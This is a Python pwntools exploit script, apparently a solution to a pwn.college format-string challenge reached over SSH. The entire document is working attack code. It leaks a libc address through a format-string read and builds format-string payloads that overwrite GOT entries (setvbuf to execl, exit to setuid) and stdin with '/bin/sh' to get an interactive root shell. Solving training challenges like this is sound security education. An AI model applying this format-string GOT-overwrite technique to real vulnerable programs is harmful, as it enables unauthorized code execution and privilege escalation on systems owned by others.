from pwn import p64,u64
from pwn import *
context.binary=e=ELF("./babyfmt_level10.1")
libc=e.libc
gs="""
b *func+386
"""
if args.DEBUG:
    context.log_level="debug"
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfmt_level10.1")
payload1=f"%{ (e.sym.func-141) & 0xffff}c%66$hnlmao%161$p".encode()
payload1+=b"continuelmao"
payload1+=b"X"*(0xf3-len(payload1))
payload1+=p64(e.got.exit)
p.sendlineafter(b"Have fun!\n",
payload1)
p.recvuntil(b"lmao0x")
leak=int(p.recv(12),16)
libc.address=leak-(libc.sym.__libc_start_main+243)
log.info(f"libc @ {hex(libc.address)}")
def overwrite_addr(addr, value,writebytes=6,padding=True):
    write1 = value & 0xffff
    write2 = (value >> 16) & 0xffff
    write3 = (value >> 32) & 0xffff
    if padding:
        write1+=0x1_0000
        write2+=0x1_0000
        write3+=0x1_0000
    writes={
        write1: addr,
        write2: addr+2,
        write3: addr+4,
    }
    write_list=[write1,write2,write3]
    if writebytes==8:
        write4 = (value >> 48) & 0xffff
        if padding:
            write4 += 0x1_0000
        writes[write4]=addr+6
        write_list.append(write4)
    write_list.sort()
    payload =f"%{write_list[0]-141}c%67$hn".encode()
    for i in range(1,len(write_list)):
        payload+=f"%{write_list[i]-write_list[i-1]}c%{67+i}$hn".encode()
    payload+=b"continuelmao"
    payload+=b"X"*(0xf3+8-len(payload))
    for i in range(len(write_list)):
        payload+=p64(writes[write_list[i]])
    payload+=b"A"*(0x300-len(payload))
    p.sendlineafter(b"continuelmao",payload)
overwrite_addr(e.got.setvbuf,libc.sym.execl)
sleep(1)
overwrite_addr(e.sym.stdin,next(libc.search(b"/bin/sh")))
sleep(1)
overwrite_addr(e.got.exit,libc.sym.setuid)
sleep(1)
p.recvuntil(b"continuelmao")
p.interactive()
